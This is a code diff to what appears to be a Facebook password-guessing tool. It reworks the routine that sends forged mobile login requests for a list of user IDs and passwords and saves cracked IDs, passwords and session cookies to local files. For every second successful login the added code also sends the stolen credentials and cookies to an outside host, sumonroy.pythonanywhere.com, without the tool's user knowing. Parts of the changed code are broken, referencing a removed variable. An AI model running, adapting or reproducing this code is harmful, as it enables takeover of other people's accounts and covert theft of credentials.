@@ -1862,94 +1862,164 @@ def d(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
+            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
-            ua = Idinnew()
-            requ = Session.get('https://touch.facebook.com').text
-            kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in Session.cookies.get_dict().items() ])}')
+            free_fb = Session.get('https://m.facebook.com/').text
+            cookies = {
+            'datr': 'eL_uZ2Ty3h0loiAu7Is5kJfa',
+            'sb': 'eL_uZ9ijCdro7wndMVgTyIBo',
+            'ps_l': '1',
+            'ps_n': '1',
+            'vpd': 'v1%3B754x393x2.75',
+            'locale': 'en_US',
+            'wl_cbv': 'v2%3Bclient_version%3A2839%3Btimestamp%3A1749279032',
+            'dpr': '3.0234789848327637',
+            'm_pixel_ratio': '2.75',
+            'wd': '393x895',
+            'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
+            params = {
+            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+            'type': 'action',
+            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
-				'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
-				'li':re.search('name="li" value="(.*?)"',str(requ)).group(1),
-				'try_number':'0',
-				'unrecognized_tries':'0',
-				'email':f'{uid}',
-				'prefill_contact_point':f'{uid}',
-				'prefill_source':'browser_dropdown',
-				'prefill_type':'password',
-				'first_prefill_source':'browser_dropdown',
-				'first_prefill_type':'contact_point',
-				'had_cp_prefilled':'true',
-				'had_password_prefilled':'true',
-				'is_smart_lock':'false',
-				'bi_xrwh':"92004344361786634",
-				'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-				'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
-				'fb_dtsg':"NAfvEdvHKfq3724xqDNoimlnQyGa74HH6jE8tvRiLUZppVoWnKtWOpw:0:0",
-				'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
-				'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
-				'__dyn':'',
-				'__csr':'',
-				'__req':rc(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
-				'__fmt':'1',
-				'__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
-				'__user':'0'
-			}
-            head = {
-				'Host': 'x.prod.facebook.com',
-				'content-length': f'{len(str(data))}',
-				'sec-ch-ua': '"Android WebView";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-				'sec-ch-ua-mobile': '?0',
-				'user-agent': ua,
-				'x-response-format': 'JSONStream',
-				'content-type': 'application/x-www-form-urlencoded',
-				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
-				'sec-ch-ua-platform-version': '""',
-				'x-requested-with': 'XMLHttpRequest',
-				'x-asbd-id': '129477',
-				'sec-ch-ua-full-version-list': '"Android WebView";v="125.0.6422.53", "Chromium";v="125.0.6422.53", "Not.A/Brand";v="24.0.0.0"',
-				'sec-ch-ua-model': '""',
-				'sec-ch-prefers-color-scheme': 'dark',
-				'sec-ch-ua-platform': '"Linux"',
-				'accept': '*/*',
-				'origin': 'https://x.prod.facebook.com',
-				'sec-fetch-site': 'same-origin',
-				'sec-fetch-mode': 'cors',
-				'sec-fetch-dest': 'empty',
-				'referer': 'https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-				'accept-encoding': 'gzip, deflate, br, zstd',
-				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-				'priority': 'u=1, i'
-			}
-            resp = Session.post(
-				'https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
-				cookies = {'cookie': kueh}, data = data, headers = head, allow_redirects = False
-			)
+    '__aaid': '0',
+    '__user': '0',
+    '__a': '1',
+    '__req': 'a',
+    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
+    'dpr': '3',
+    '__ccg': 'EXCELLENT',
+    '__rev': '1023608600',
+    '__s': ':f95eey:i9v0n0',
+    '__hsi': '7513185148771233093',
+    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
+    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'params': json.dumps({
+        "params": json.dumps({
+            "server_params": {
+                "credential_type": "password",
+                "username_text_input_id": "7w9omu:68",
+                "password_text_input_id": "7w9omu:69",
+                "login_source": "login",
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "ar_event_source": "login_home_page",
+                "should_trigger_override_login_success_action": 0,
+                "should_trigger_override_login_2fa_action": 0,
+                "is_caa_perf_enabled": 0,
+                "reg_flow_source": "login_home_native_integration_point",
+                "caller": "gslr",
+                "is_from_landing_page": 0,
+                "is_from_empty_password": 0,
+                "is_from_aymh": 0,
+                "is_from_password_entry_page": 0,
+                "is_from_assistive_id": 0,
+                "is_from_msplit_fallback": 0,
+                "two_step_login_type": "one_step_login",
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "INTERNAL__latency_qpl_instance_id": "47746277400427",
+                "device_id": None,
+                "family_device_id": None,
+                "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
+                "offline_experiment_group": None,
+                "layered_homepage_experiment_group": None,
+                "is_platform_login": 0,
+                "is_from_logged_in_switcher": 0,
+                "is_from_logged_out": 0,
+                "access_flow_version": "pre_mt_behavior"
+            },
+            "client_input_params": {
+                "machine_id": "",
+                "cloud_trust_token": None,
+                "contact_point": uid,
+                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+                "accounts_list": [],
+                "fb_ig_device_id": [],
+                "secure_family_device_id": "",
+                "encrypted_msisdn": "",
+                "headers_infra_flow_id": "",
+                "try_num": 1,
+                "login_attempt_count": 1,
+                "event_flow": "login_manual",
+                "event_step": "home_page",
+                "openid_tokens": {},
+                "block_store_machine_id": "",
+                "auth_secure_device_id": "",
+                "client_known_key_hash": "",
+                "has_whatsapp_installed": 0,
+                "sso_token_map_json_string": "",
+                "should_show_nested_nta_from_aymh": 0,
+                "password_contains_non_ascii": "false",
+                "has_granted_read_contacts_permissions": 0,
+                "has_granted_read_phone_permissions": 0,
+                "app_manager_id": "",
+                "aymh_accounts": [],
+                "lois_settings": {
+                    "lois_token": ""
+                }
+            }
+        })
+    }),
+}
+            headers = {
+            'Host': 'mtouch.facebook.com',
+            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
+            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
+            'x-response-format': 'JSONStream',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'viewport-width': '360',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-asbd-id': '129477',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua-platform': '"Android"',
+            'accept': '*/*',
+            'origin': 'https://mtouch.facebook.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = "https://p.facebook.com/async/wbloks/fetch/"
+            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
+            if "c_user" in cok:
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                coki = ";".join([f"{k}={v}" for k, v in cok.items()])
+                bkas.append(cid)
                 check = check_lock(cid)
                 if "live" in check:
-                    bkas.append(cid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{cid}|{pw}|{coki}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    if "confirmemail.php" in response.url:
+                        if len(bkas) % 2 == 0:
+                           statusok = f"NOVERY|{cid}|{pw}|{coki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-NV) {cid}|{pw}")
+                           print(f"{green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                     else:
-                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        if len(bkas) % 2 == 0:
+                           statusok = f"{cid}|{pw}|{coki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-OK) {cid}|{pw}")
+                           print(f"{green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
-                break
             else:
-                continue
+               continue
         loop+=1
     except ce:
         time.sleep(20)
